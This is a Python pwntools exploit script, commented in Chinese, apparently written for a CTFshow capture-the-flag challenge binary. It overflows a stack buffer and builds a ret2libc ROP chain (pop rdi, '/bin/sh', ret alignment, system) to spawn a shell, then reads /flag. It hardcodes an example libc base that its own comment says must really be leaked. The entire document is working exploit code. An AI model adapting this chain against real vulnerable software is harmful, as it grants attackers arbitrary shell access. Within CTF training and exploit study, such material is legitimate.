#!/usr/bin/env python3
from pwn import *
from kk import *

context(arch='amd64', os='linux')
context.log_level = 'info'

elf = ELF('./pwn')
p = process('./pwn')

# 获取 gadgets
K, L = libcrop(elf)

# ============================================================
# 关键 gadgets
# ============================================================
pop_rdi = K['pop_rdi']
pop_r12_r13_r14_r15 = K.get('pop_r12_r13_r14_r15')
ret = K['ret']

print("=" * 60)
print("利用 ret2libc 获取 shell")
print("=" * 60)
print(f"pop_rdi: {hex(pop_rdi)}")
print(f"pop_r12_r13_r14_r15: {hex(pop_r12_r13_r14_r15)}")
print(f"ret: {hex(ret)}")
print()

# ============================================================
# 使用 libc gadgets
# ============================================================
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_base = 0x741a76a00000  # 示例地址，实际需要泄露

K_libc, L_libc = libcrop(elf, libc, libc_base)

# Libc gadgets
pop_rsi = L_libc.get('pop_rsi')
pop_rdx_r12 = L_libc.get('pop_rdx_r12')

print(f"Libc pop_rsi: {hex(pop_rsi) if pop_rsi else 'None'}")
print(f"Libc pop_rdx_r12: {hex(pop_rdx_r12) if pop_rdx_r12 else 'None'}")
print()

if not pop_rsi or not pop_rdx_r12:
    print("[!] 缺少必要的 libc gadgets")
    print("[*] 尝试使用 ROPgadget 直接搜索...")

    # 使用 ROPgadget 搜索 pop rsi
    result = subprocess.run(['ROPgadget', '--binary', '/lib/x86_64-linux-gnu/libc.so.6'],
                          capture_output=True, text=True)
    for line in result.stdout.split('\n'):
        if 'pop rsi ; ret' in line.lower():
            print(f"找到: {line}")

    p.interactive()
    exit()

# ============================================================
# 构造 ROP 链：system("/bin/sh")
# ============================================================
system_offset = libc.symbols['system']
bin_sh_offset = next(libc.search(b'/bin/sh\x00'))

system_addr = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset

print(f"system: {hex(system_addr)}")
print(f"/bin/sh: {hex(bin_sh_addr)}")
print()

# 构造 payload
payload = b'A' * 0x70  # 填充缓冲区
payload += b'B' * 8     # 填充 saved rbp

# 调用 system("/bin/sh")
payload += p64(pop_rdi) + p64(bin_sh_addr)
payload += p64(ret)  # 栈对齐
payload += p64(system_addr)

print(f"[*] 发送 payload ({len(payload)} 字节)")

# 接收欢迎信息
p.recvuntil(b'CTFshow PWN!\n')

# 发送 payload
p.sendline(payload)

# 获取 shell
time.sleep(0.5)
p.sendline(b'echo pwned!')
p.sendline(b'cat /flag')

p.interactive()
